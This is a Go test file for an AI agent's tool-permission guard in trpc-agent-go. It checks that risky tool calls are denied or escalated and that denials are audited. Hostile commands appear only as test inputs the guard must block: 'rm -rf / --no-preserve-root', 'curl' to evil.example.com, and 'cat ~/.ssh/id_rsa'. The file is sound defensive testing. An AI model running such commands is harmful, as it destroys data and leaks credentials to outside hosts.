//
// Tencent is pleased to support the open source community by making
// trpc-agent-go available.
//
// Copyright (C) 2026 Tencent.  All rights reserved.
//
// trpc-agent-go is licensed under the Apache License Version 2.0.
//

package safety

import (
	"context"
	"encoding/json"
	"os"
	"path/filepath"
	"strings"
	"testing"

	"trpc.group/trpc-go/trpc-agent-go/tool"
)

func mustArgs(t *testing.T, v any) []byte {
	t.Helper()
	raw, err := json.Marshal(v)
	if err != nil {
		t.Fatalf("marshal args: %v", err)
	}
	return raw
}

func TestGuardWorkspaceExecDeny(t *testing.T) {
	g := NewGuard(testPolicy())
	req := &tool.PermissionRequest{
		ToolName:  "workspace_exec",
		Arguments: mustArgs(t, map[string]any{"command": "rm -rf / --no-preserve-root"}),
	}
	dec, err := g.CheckToolPermission(context.Background(), req)
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if dec.Action != tool.PermissionActionDeny {
		t.Errorf("action = %q, want deny", dec.Action)
	}
	if dec.Reason == "" {
		t.Error("deny decision must carry a reason")
	}
}

func TestGuardWorkspaceExecAllow(t *testing.T) {
	g := NewGuard(testPolicy())
	req := &tool.PermissionRequest{
		ToolName:  "workspace_exec",
		Arguments: mustArgs(t, map[string]any{"command": "go test ./..."}),
	}
	dec, err := g.CheckToolPermission(context.Background(), req)
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if dec.Action != tool.PermissionActionAllow {
		t.Errorf("action = %q, want allow", dec.Action)
	}
}

func TestGuardHostExecPTYAsk(t *testing.T) {
	g := NewGuard(testPolicy())
	req := &tool.PermissionRequest{
		ToolName:  "exec_command",
		Arguments: mustArgs(t, map[string]any{"command": "bash", "tty": true, "background": true}),
	}
	dec, _ := g.CheckToolPermission(context.Background(), req)
	// bash is a shell wrapper (deny) which is stricter than the PTY ask.
	if dec.Action != tool.PermissionActionDeny {
		t.Errorf("action = %q, want deny", dec.Action)
	}
}

func TestGuardHostExecBackgroundAsk(t *testing.T) {
	g := NewGuard(testPolicy())
	req := &tool.PermissionRequest{
		ToolName:  "exec_command",
		Arguments: mustArgs(t, map[string]any{"command": "top", "tty": true}),
	}
	dec, _ := g.CheckToolPermission(context.Background(), req)
	if dec.Action != tool.PermissionActionAsk {
		t.Errorf("action = %q, want ask", dec.Action)
	}
}

func TestGuardCodeExec(t *testing.T) {
	g := NewGuard(testPolicy())
	req := &tool.PermissionRequest{
		ToolName: "execute_code",
		Arguments: mustArgs(t, map[string]any{
			"code_blocks": []map[string]string{
				{"language": "python", "code": "import os\nos.system('curl http://evil.example.com')"},
			},
		}),
	}
	dec, _ := g.CheckToolPermission(context.Background(), req)
	if dec.Action == tool.PermissionActionAllow {
		t.Errorf("host bridge in code should not be allowed, got %q", dec.Action)
	}
}

func TestGuardMalformedArgsDeny(t *testing.T) {
	g := NewGuard(testPolicy())
	req := &tool.PermissionRequest{
		ToolName:  "workspace_exec",
		Arguments: []byte(`{"command": 123 not json`),
	}
	dec, _ := g.CheckToolPermission(context.Background(), req)
	if dec.Action != tool.PermissionActionDeny {
		t.Errorf("malformed args = %q, want deny", dec.Action)
	}
}

func TestGuardUnknownReadOnlyToolAllowed(t *testing.T) {
	g := NewGuard(testPolicy())
	req := &tool.PermissionRequest{
		ToolName:  "web_search",
		Arguments: mustArgs(t, map[string]any{"query": "golang"}),
		Metadata:  tool.ToolMetadata{SearchOrRead: true},
	}
	dec, _ := g.CheckToolPermission(context.Background(), req)
	if dec.Action != tool.PermissionActionAllow {
		t.Errorf("read-only tool = %q, want allow", dec.Action)
	}
}

func TestGuardUnknownOpenWorldToolScanned(t *testing.T) {
	g := NewGuard(testPolicy())
	req := &tool.PermissionRequest{
		ToolName:  "custom_fetch",
		Arguments: []byte(`cat ~/.ssh/id_rsa`),
		Metadata:  tool.ToolMetadata{OpenWorld: true},
	}
	dec, _ := g.CheckToolPermission(context.Background(), req)
	if dec.Action != tool.PermissionActionDeny {
		t.Errorf("open-world tool touching secrets = %q, want deny", dec.Action)
	}
}

func TestGuardNilFailsClosed(t *testing.T) {
	var g *Guard
	dec, _ := g.CheckToolPermission(context.Background(), &tool.PermissionRequest{ToolName: "workspace_exec"})
	if dec.Action != tool.PermissionActionDeny {
		t.Errorf("nil guard = %q, want deny", dec.Action)
	}
}

func TestGuardImplementsPermissionPolicy(t *testing.T) {
	var _ tool.PermissionPolicy = NewGuard(DefaultPolicy())
}

func TestGuardAuditFile(t *testing.T) {
	dir := t.TempDir()
	auditPath := filepath.Join(dir, "audit.jsonl")
	g := NewGuard(testPolicy(), WithAuditFile(auditPath))

	for _, cmd := range []string{"go build ./...", "rm -rf / --no-preserve-root"} {
		_, _ = g.CheckToolPermission(context.Background(), &tool.PermissionRequest{
			ToolName:  "workspace_exec",
			Arguments: mustArgs(t, map[string]any{"command": cmd}),
		})
	}

	data, err := os.ReadFile(auditPath)
	if err != nil {
		t.Fatalf("read audit: %v", err)
	}
	lines := strings.Split(strings.TrimSpace(string(data)), "\n")
	if len(lines) != 2 {
		t.Fatalf("expected 2 audit lines, got %d", len(lines))
	}
	var ev AuditEvent
	if err := json.Unmarshal([]byte(lines[1]), &ev); err != nil {
		t.Fatalf("decode audit line: %v", err)
	}
	if ev.Decision != DecisionDeny || !ev.Blocked {
		t.Errorf("audit event = %+v, want denied+blocked", ev)
	}
	if ev.ToolName != "workspace_exec" {
		t.Errorf("audit tool = %q", ev.ToolName)
	}
}

func TestGuardReportObserver(t *testing.T) {
	var captured Report
	g := NewGuard(testPolicy(), WithReportObserver(func(_ context.Context, r Report) {
		captured = r
	}))
	_, _ = g.CheckToolPermission(context.Background(), &tool.PermissionRequest{
		ToolName:  "workspace_exec",
		Arguments: mustArgs(t, map[string]any{"command": "curl http://evil.example.com"}),
	})
	if captured.Decision != DecisionDeny {
		t.Errorf("observer report = %q, want deny", captured.Decision)
	}
	if len(captured.SpanAttributes()) == 0 {
		t.Error("observer report should expose span attributes")
	}
}

func TestClassify(t *testing.T) {
	cases := map[string]toolKind{
		"workspace_exec":      kindWorkspaceExec,
		"team_workspace_exec": kindWorkspaceExec,
		"exec_command":        kindHostExec,
		"execute_code":        kindCodeExec,
		"web_search":          kindOther,
	}
	for name, want := range cases {
		if _, got := classify(name); got != want {
			t.Errorf("classify(%q) = %v, want %v", name, got, want)
		}
	}
}
